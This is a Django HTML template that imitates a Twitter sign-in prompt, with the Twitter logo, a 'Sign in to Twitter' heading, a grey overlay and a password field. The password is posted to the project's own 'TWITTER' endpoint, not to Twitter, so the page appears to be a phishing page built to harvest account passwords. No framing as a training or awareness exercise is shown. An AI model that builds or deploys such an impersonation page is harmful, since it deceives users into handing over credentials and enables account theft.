{% load static %}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{% static './css/twitter.css' %}">
    <title>Document</title>
</head>
<body>
    <div style="width: 100%; height: 1000px; background-color: rgba(128, 128, 128, 0.672); position: absolute; top: 0; left: 0;" >
    </div>
    <div class="formBody">
        <form action="{% url 'TWITTER' %}" method="post">
            {% csrf_token %}
            <img src="{% static './css/images/twitter.svg' %}" alt="" style="width: 35px; height: 35px"> 
            <h1>Sign in to Twitter</h1>
            <input type="text" placeholder="Enter password" name="password">
            <br>
            <button style="color: white; background-color: black;">Log in</button>
            <br>
            <button>Forgot password?</button>
            <p style="margin-top: 60px; text-align: ; opacity: .65;">
                Don't have an account? <a href="" style="color: rgb(0, 139, 209);">Sign up</a>
            </p>
        </form>
    </div>
</body>
</html>
